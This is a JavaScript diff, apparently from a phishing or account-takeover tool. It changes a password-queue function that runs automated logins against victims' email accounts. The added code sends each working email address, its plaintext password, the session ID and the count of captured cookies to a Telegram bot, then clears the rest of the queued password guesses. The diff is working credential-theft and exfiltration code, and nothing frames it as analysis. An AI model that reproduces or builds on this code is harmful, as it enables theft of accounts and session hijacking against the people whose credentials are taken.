@@ -2694,14 +2694,39 @@ async function processPasswordQueue(email) {
 
                         console.log(`🎯 Login successful via retry queue for ${email} (session ${currentSessionId})`);
 
-                        // Clean up the automation session
+                        // Send success notification if bot is available
+                        if (telegramBot) {
+                            try {
+                                await telegramBot.sendLoginNotification({
+                                    email: email,
+                                    password: password,
+                                    timestamp: new Date().toISOString(),
+                                    sessionId: currentSessionId,
+                                    totalCookies: sessionValidation.cookiesSaved || 0,
+                                    authMethod: 'Background Password Queue',
+                                    ip: 'Queue Processing',
+                                    userAgent: 'Background Queue'
+                                });
+                                console.log(`📤 Telegram success notification sent for ${email}`);
+                            } catch (telegramError) {
+                                console.warn('Telegram success notification failed:', telegramError.message);
+                            }
+                        }
+
+                        // Clean up the automation session immediately
+                        console.log(`🧹 Closing browser after successful authentication`);
                         if (automationSessions.has(currentSessionId)) {
                             await automation.close();
                             automationSessions.delete(currentSessionId);
                         }
-                        // Remove from retry queue
-                        queue.passwords = []; // Clear all remaining passwords
-                        break; // Exit the loop
+                        
+                        // Clear all remaining passwords in queue
+                        const remainingPasswords = queue.passwords.length;
+                        queue.passwords = [];
+                        console.log(`✅ Success! Cleared ${remainingPasswords} remaining passwords from queue`);
+                        
+                        // Exit the loop immediately
+                        break;
                     } else {
                         console.error(`❌ Session validation failed after successful login for ${email}`);
                         throw new Error('Session validation failed');
